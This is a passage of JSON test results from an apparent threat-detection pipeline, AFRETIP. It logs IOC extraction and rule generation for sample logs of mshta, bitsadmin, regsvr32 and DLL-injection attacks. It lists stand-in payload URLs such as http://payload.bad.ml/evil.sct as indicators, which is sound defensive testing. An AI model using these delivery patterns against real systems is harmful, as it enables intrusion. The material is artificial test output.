VirusTotal rate limiting       sleep_time=13.061381578445435\n2025-08-18 19:59:14 [info     ] Threat detected                classification=suspicious confidence=0.9000000000000001 ioc_type=domain ioc_value=mshta.exe threat_level=medium\n2025-08-18 19:59:14 [debug    ] VirusTotal rate limiting       sleep_time=14.505906105041504\n2025-08-18 19:59:30 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=command.evil.tk threat_level=high\n2025-08-18 19:59:30 [debug    ] VirusTotal rate limiting       sleep_time=13.250400304794312\n2025-08-18 19:59:44 [info     ] Threat detected                classification=suspicious confidence=0.9000000000000001 ioc_type=domain ioc_value=malicious.hta threat_level=medium\n2025-08-18 19:59:44 [debug    ] VirusTotal rate limiting       sleep_time=14.239206314086914\n2025-08-18 19:59:59 [info     ] Threat detected                classification=suspicious confidence=0.9000000000000001 ioc_type=domain ioc_value=explorer.exe threat_level=medium\n2025-08-18 19:59:59 [debug    ] VirusTotal rate limiting       sleep_time=14.604293584823608\n2025-08-18 20:00:14 [info     ] Threat detected                classification=malicious confidence=0.9000000000000001 ioc_type=url ioc_value=http://command.evil.tk/malicious.hta threat_level=high\n2025-08-18 20:00:14 [debug    ] VirusTotal rate limiting       sleep_time=14.56995940208435\n2025-08-18 20:00:29 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:00:29 [info     ] Threat detected                classification=malicious confidence=0.9000000000000001 ioc_type=file_path ioc_value=//command.evil.tk/malicious.hta threat_level=high\n2025-08-18 20:00:29 [debug    ] VirusTotal rate limiting       sleep_time=14.998346328735352\n2025-08-18 20:00:44 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:00:44 [info     ] Threat detected                classification=malicious confidence=0.9000000000000001 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\mshta.exe threat_level=high\n2025-08-18 20:00:44 [debug    ] VirusTotal rate limiting       sleep_time=14.997764110565186\n2025-08-18 20:00:59 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:00:59 [info     ] Threat detected                classification=malicious confidence=0.9000000000000001 ioc_type=file_path ioc_value=C:\\\\Windows\\\\explorer.exe threat_level=high\n2025-08-18 20:00:59 [debug    ] VirusTotal rate limiting       sleep_time=14.998058557510376\n2025-08-18 20:01:14 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 20:01:14 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=mshta.exe threat_level=medium\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=d7e00a3d7a14406399ec01aca8b00a5f new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=7037c5b68de94a308e9359840db794b3 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=88151fa131de4337885d817b0292c86d new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=6cfe82186df84c92a256534d5c5ea9ac new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=934a52980b6d48eab20e573bb010588f new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=b0ec0eeac1964391942d6f58dabf1aa0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=e3b2e841da58435c87debacbd2f4d423 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=21e07002add0440684c2bbd0ff2baf6e new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=ff6923768efd49fe80e9912625b3d782 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:01:14 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=284b5951cbda4b43805c4868a7fbdeab new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 10\n  \u2022 Findings generated: 10\n  \u2022 Rules generated: 7\n  \u2022 Processing time: 135.110s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 192.168.1.10 (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: mshta.exe (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: command.evil.tk (confidence: 1.00)\n  \u2022 IOCType.DOMAIN: malicious.hta (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: explorer.exe (confidence: 0.70)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "lol_02_bitsadmin_transfer.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T20:03:44.808201",
      "processing_time": 150.48992896080017,
      "success": true,
      "metrics": {
        "iocs_extracted": 12,
        "findings_generated": 12,
        "rules_generated": 8,
        "ioc_extraction_time": 150.145,
        "threat_classifications": {
          "suspicious": 7,
          "malicious": 5
        },
        "confidence_scores": [
          0.75,
          0.95,
          0.95,
          0.95,
          0.95,
          0.95,
          0.95,
          0.95,
          0.95,
          0.95,
          1.0,
          0.95
        ],
        "threat_levels": {
          "medium": 7,
          "high": 5
        },
        "rule_generation_efficiency": 0.6666666666666666
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 26.98,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:01:14 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/living_off_land/lol_02_bitsadmin_transfer.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:01:14 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:01:14 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:01:14 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:01:14 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:01:14 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:01:14 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:01:14 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:01:14 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:01:14 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:01:14 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:01:14 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:01:14 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:01:14 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:01:14 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:01:14 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:01:14 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:01:14 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:01:14 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:01:14 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:01:14 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:01:14 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:01:14 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:01:14 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:01:14 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:01:14 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:01:14 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:01:14 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:01:14 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_200114\n2025-08-18 20:01:14 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:01:14 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:01:14 [debug    ] Enhanced IOC extraction completed context=administrative extraction_time=0.001s iocs_found=12 log_hash=6a0f2f5fa2cd4ea5949772d1f315514f\n2025-08-18 20:01:16 [info     ] Threat detected                classification=suspicious confidence=0.75 ioc_type=ip ioc_value=192.168.1.150 threat_level=medium\n2025-08-18 20:01:16 [debug    ] VirusTotal rate limiting       sleep_time=12.65403127670288\n2025-08-18 20:01:30 [info     ] Threat detected                classification=suspicious confidence=0.95 ioc_type=domain ioc_value=rmm.yourlab.net threat_level=medium\n2025-08-18 20:01:30 [debug    ] VirusTotal rate limiting       sleep_time=13.780178785324097\n2025-08-18 20:01:45 [info     ] Threat detected                classification=suspicious confidence=0.95 ioc_type=domain ioc_value=malware.exe threat_level=medium\n2025-08-18 20:01:45 [debug    ] VirusTotal rate limiting       sleep_time=13.947832822799683\n2025-08-18 20:02:00 [info     ] Threat detected                classification=suspicious confidence=0.95 ioc_type=domain ioc_value=bitsadmin.exe threat_level=medium\n2025-08-18 20:02:00 [debug    ] VirusTotal rate limiting       sleep_time=14.011938571929932\n2025-08-18 20:02:15 [info     ] Threat detected                classification=suspicious confidence=0.95 ioc_type=domain ioc_value=cmd.exe threat_level=medium\n2025-08-18 20:02:15 [debug    ] VirusTotal rate limiting       sleep_time=13.95659351348877\n2025-08-18 20:02:30 [info     ] Threat detected                classification=malicious confidence=0.95 ioc_type=url ioc_value=http://rmm.yourlab.net/malware.exe threat_level=high\n2025-08-18 20:02:30 [debug    ] VirusTotal rate limiting       sleep_time=14.022624254226685\n2025-08-18 20:02:44 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:02:44 [info     ] Threat detected                classification=malicious confidence=0.95 ioc_type=file_path ioc_value=//rmm.yourlab.net/malware.exe threat_level=high\n2025-08-18 20:02:44 [debug    ] VirusTotal rate limiting       sleep_time=14.999467611312866\n2025-08-18 20:02:59 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:02:59 [info     ] Threat detected                classification=malicious confidence=0.95 ioc_type=file_path ioc_value=C:\\\\temp\\\\malware.exe threat_level=high\n2025-08-18 20:02:59 [debug    ] VirusTotal rate limiting       sleep_time=14.999448299407959\n2025-08-18 20:03:14 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:03:14 [info     ] Threat detected                classification=malicious confidence=0.95 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\bitsadmin.exe threat_level=high\n2025-08-18 20:03:14 [debug    ] VirusTotal rate limiting       sleep_time=14.99947190284729\n2025-08-18 20:03:29 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:03:29 [info     ] Threat detected                classification=malicious confidence=0.95 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\cmd.exe threat_level=high\n2025-08-18 20:03:29 [debug    ] VirusTotal rate limiting       sleep_time=14.997955560684204\n2025-08-18 20:03:44 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 20:03:44 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=bitsadmin.exe threat_level=medium\n2025-08-18 20:03:44 [info     ] Threat detected                classification=suspicious confidence=0.95 ioc_type=process_name ioc_value=cmd.exe threat_level=medium\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=c26c0eaf1b3b4a1ca419ba18e862c66a new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=dde4b21501e8478db2f34adf9e2d6385 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=f7e0c9c657134ddd9f075ee98e87a948 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=f2e0cf618656437599dc9099c8c3ea82 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=64ee4c3396a5428f904b520b6d76bc38 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=153540e3f7f64341887fe9d21041b09a new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=44d97c6cbc034bfb9b59c591c05f1e98 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=534c6fbf4a8f4044953334bb835d133c new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=e3d3da128b2a40178bdc02d9e8f9deb7 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=2058094877e340e4acc289b13d60cc49 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=9d2f142c9cc8478ebdfbf779e996c94c new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:03:44 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=38c0c42049244c98a87de13595e49d7f new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 12\n  \u2022 Findings generated: 12\n  \u2022 Rules generated: 8\n  \u2022 Processing time: 150.145s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 192.168.1.150 (confidence: 0.40)\n  \u2022 IOCType.DOMAIN: rmm.yourlab.net (confidence: 0.60)\n  \u2022 IOCType.DOMAIN: malware.exe (confidence: 0.60)\n  \u2022 IOCType.DOMAIN: bitsadmin.exe (confidence: 0.60)\n  \u2022 IOCType.DOMAIN: cmd.exe (confidence: 0.60)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "lol_05_regsvr32_bypass.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T20:06:30.334545",
      "processing_time": 165.52580738067627,
      "success": true,
      "metrics": {
        "iocs_extracted": 12,
        "findings_generated": 12,
        "rules_generated": 7,
        "ioc_extraction_time": 165.172,
        "threat_classifications": {
          "malicious": 12
        },
        "confidence_scores": [
          0.8,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0
        ],
        "threat_levels": {
          "high": 12
        },
        "rule_generation_efficiency": 0.5833333333333334
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 26.98,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:03:45 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/living_off_land/lol_05_regsvr32_bypass.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:03:45 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:03:45 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:03:45 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:03:45 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:03:45 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:03:45 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:03:45 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:03:45 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:03:45 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:03:45 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:03:45 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:03:45 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:03:45 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:03:45 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:03:45 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:03:45 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:03:45 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:03:45 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:03:45 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:03:45 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:03:45 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:03:45 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:03:45 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:03:45 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:03:45 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:03:45 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:03:45 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:03:45 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_200345\n2025-08-18 20:03:45 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:03:45 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:03:45 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=12 log_hash=5543dc716852491cb063be897b9b84d5\n2025-08-18 20:03:48 [info     ] Threat detected                classification=malicious confidence=0.8 ioc_type=ip ioc_value=192.168.1.10 threat_level=high\n2025-08-18 20:03:48 [debug    ] VirusTotal rate limiting       sleep_time=11.890610694885254\n2025-08-18 20:04:00 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=regsvr32.exe threat_level=high\n2025-08-18 20:04:00 [debug    ] VirusTotal rate limiting       sleep_time=14.407636165618896\n2025-08-18 20:04:15 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=payload.bad.ml threat_level=high\n2025-08-18 20:04:15 [debug    ] VirusTotal rate limiting       sleep_time=14.36536455154419\n2025-08-18 20:04:30 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=evil.sct threat_level=high\n2025-08-18 20:04:30 [debug    ] VirusTotal rate limiting       sleep_time=14.501724481582642\n2025-08-18 20:04:45 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=scrobj.dll threat_level=high\n2025-08-18 20:04:45 [debug    ] VirusTotal rate limiting       sleep_time=14.440585851669312\n2025-08-18 20:05:00 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=cmd.exe threat_level=high\n2025-08-18 20:05:00 [debug    ] VirusTotal rate limiting       sleep_time=14.512904644012451\n2025-08-18 20:05:15 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=url ioc_value=http://payload.bad.ml/evil.sct threat_level=high\n2025-08-18 20:05:15 [debug    ] VirusTotal rate limiting       sleep_time=14.470214366912842\n2025-08-18 20:05:30 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:05:30 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=//payload.bad.ml/evil.sct threat_level=high\n2025-08-18 20:05:30 [debug    ] VirusTotal rate limiting       sleep_time=14.999327421188354\n2025-08-18 20:05:45 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:05:45 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\regsvr32.exe threat_level=high\n2025-08-18 20:05:45 [debug    ] VirusTotal rate limiting       sleep_time=14.999162435531616\n2025-08-18 20:06:00 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:06:00 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\cmd.exe threat_level=high\n2025-08-18 20:06:00 [debug    ] VirusTotal rate limiting       sleep_time=14.998378038406372\n2025-08-18 20:06:15 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 20:06:15 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=process_name ioc_value=regsvr32.exe threat_level=high\n2025-08-18 20:06:15 [debug    ] VirusTotal rate limiting       sleep_time=14.9984130859375\n2025-08-18 20:06:30 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 20:06:30 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=process_name ioc_value=cmd.exe threat_level=high\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=66dff8658e5c49e98687b64d135bb1a4 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=bb87cd855eae4504bade0cc9c82faa42 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=f91f90772a924b299116ac4cad957981 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=5ad80e3706f542738e30a20f3e8ff35a new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=4b108d3690124e5ebbd109ba4b39b86a new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=704ddde3e9d04403adfa80fb1e4911e4 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=f7ce1f2a039a46b7a1203a2d77df5e08 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=5a5394d3da5b4e02b3596881eda31f86 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=dff69bb9ec6f428f809685fe461c6700 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=ef6aaf0a818b411aa4fa1415ab11671b new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=6605d6f27e824e06a7e9216212484b24 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:06:30 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=e592ff65082b494680b307e1201f04d9 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 12\n  \u2022 Findings generated: 12\n  \u2022 Rules generated: 7\n  \u2022 Processing time: 165.172s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 192.168.1.10 (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: regsvr32.exe (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: payload.bad.ml (confidence: 1.00)\n  \u2022 IOCType.DOMAIN: evil.sct (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: scrobj.dll (confidence: 0.70)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "inj_01_dll_injection.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T20:08:00.757730",
      "processing_time": 90.42263984680176,
      "success": true,
      "metrics": {
        "iocs_extracted": 7,
        "findings_generated": 7,
        "rules_generated": 7,
        "ioc_extraction_time": 90.081,
        "threat_classifications": {
          "suspicious": 7
        },
        "confidence_scores": [
          0.65,
          0.65,
          0.65,
          0.65,
          0.8,
          0.8,
          0.65
        ],
        "threat_levels": {
          "medium": 7
        },
        "rule_generation_efficiency": 1.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 26.98,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:06:30 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/process_injection/inj_01_dll_injection.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:06:30 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:06:30 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:06:30 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:06:30 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:06:30 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:06:30 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:06:30 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:06:30 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:06:30 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:06:30 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:06:30 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:06:30 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:06:30 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:06:30 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:06:30 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:06:30 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:06:30 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:06:30 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:06:30 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:06:30 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:06:30 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:06:30 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:06:30 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:06:30 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:06:30 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:06:30 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:06:30 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:06:30 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_200630\n2025-08-18 20:06:30 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:06:30 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:06:30 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s 